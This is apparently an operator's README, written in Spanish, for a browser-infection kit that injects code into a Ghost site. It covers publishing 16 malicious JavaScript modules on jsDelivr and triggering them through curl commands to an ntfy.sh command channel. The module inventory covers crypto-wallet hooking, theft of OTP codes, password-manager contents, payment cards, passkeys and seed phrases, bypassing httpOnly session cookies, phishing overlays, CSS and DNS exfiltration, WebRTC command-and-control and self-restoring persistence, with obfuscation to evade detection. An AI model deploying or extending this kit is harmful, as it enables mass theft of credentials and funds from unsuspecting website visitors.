# Fase de Mejora Masiva — Módulos (jsDelivr staging)

16 módulos ofensivos cargados on-demand por el `stageGate` del FOOT o por el stager ntfy.
El FOOT/HEAD **no crece** (sigue ~64KB): lo pesado vive aquí y se sirve con https válido público.

## 1. Publicar en jsDelivr (hosting de módulos)

```bash
cd /Users/ender/Documents/Red_Lab/WebView_Infector/lab
# 1. Sube lab/modules/ a un repo GitHub público (ej. usuario/redlab-arsenal, rama main)
gh repo create usuario/redlab-arsenal --public --source=modules --push
# o: copia modules/ a tu repo existente y push
```

jsDelivr sirve automáticamente: `https://cdn.jsdelivr.net/gh/USUARIO/REPO@main/m-wallet.js` (si modules/ es la raíz del repo) o `.../modules/m-wallet.js` (si es subcarpeta).

## 2. Configurar MODULES_BASE en el FOOT

Edita `ghost/ghost_code_injection.html`, línea `_C`:
```javascript
MODULES_BASE:'https://cdn.jsdelivr.net/gh/USUARIO/REPO@main/',  // ← tu URL jsDelivr (raíz de modules/)
```
El `stageGate` carga automáticamente los módulos según el contexto del visitante:
- `window.ethereum`/`web3` → `m-wallet`
- `PaymentRequest` → `m-cards`
- `credentials`+`PublicKeyCredential` → `m-webauthn-theft`
- cookie `ghost-members*` (miembro logueado) → `m-otp`, `m-pm`, `m-recovery`
- siempre → `m-cookie-store`, `m-modernapi`, `m-persist`, `m-css-exfil`

## 3. Activar módulos manualmente vía stager ntfy (on-demand)

```bash
# phishing overlay/tabnab (default off)
curl -X POST -d '{"type":"eval","id":"x","token":"redlab-ge-2026","code":"window.__GE__.stage(\"https://cdn.jsdelivr.net/gh/U/R@main/m-phishing.js\")"}' https://ntfy.sh/redlab-ge-7x3k9m2-cmd

# anti-debug, smuggling, webrtc-c2, dns-exfil, fedcm (bajo demanda)
curl -X POST -d '{"type":"stage","id":"x","token":"redlab-ge-2026","url":"https://cdn.jsdelivr.net/gh/U/R@main/m-webrtc-c2.js"}' https://ntfy.sh/redlab-ge-7x3k9m2-cmd
```

## 4. Testing local (sin jsDelivr)

El C2 local sirve los módulos para probar antes de publicar:
```bash
cd c2 && node server.js
# módulos en: https://localhost:8443/m/m-wallet.js  (requiere CA del lab en el navegador de test)
```
Probes: `cd tools/browser && node ws2-modules-test.mjs` (valida arquitectura modular con mocks).

## Inventario de módulos (16)

| WS | Módulo | Qué captura/hace |
|----|--------|------------------|
| WS2 | m-wallet | EIP-1193 hook (accounts/balance/sign), WalletConnect URI |
| WS2 | m-otp | 2FA/OTP inputs + recovery codes del DOM |
| WS2 | m-pm | LastPass/1Password/Bitwarden detect + autofill vacuum |
| WS2 | m-cards | Google Pay/Apple Pay/basic-card enum + billing |
| WS2 | m-webauthn-theft | passkey roster (allowCredentials) + rpId |
| WS2 | m-recovery | backup/seed phrases + screenshot detection |
| WS3 | m-css-exfil | exfil sin-JS anti-CSP (char-by-char vía CSS) |
| WS3 | m-cookie-store | **BYPASS cookies httpOnly** (sesión admin/member) |
| WS3 | m-phishing | overlay/tabnab UI (absorbe tabnab/overlay del FOOT) |
| WS3 | m-anti-debug | debugger loop + DevTools detection silencioso |
| WS3 | m-fedcm | Google/Facebook/Apple federated creds |
| WS3 | m-smuggling | blob/import-map/svg-use smuggling |
| WS4 | m-modernapi | WebGPU, BT/USB/Serial/HID, Topics, PST |
| WS6 | m-webrtc-c2 | DataChannel C2 (bypass CSP connect-src) |
| WS6 | m-dns-exfil | DNS tunneling (bypass connect-src total) |
| WS7 | m-persist | OPFS + triple-redundancy self-restore |

## Canales C2 (sin cert)
- Exfil: ntfy.sh + Ghost Admin API (same-origin) + exfil chunked si >4KB
- Stager bidireccional: ntfy (eval/stage/exec con token)
- Backup stealth: WebRTC DataChannel + DNS (módulos WS6)

## Riesgo (raw power)
El operador asume riesgo de re-bloqueo HTTP 459 de Ghost Pro. Si ocurre: limpiar vía Admin API (sigue accesible). `build/obfuscate.mjs` (WS5) disponible para reducir superficie de firmas.
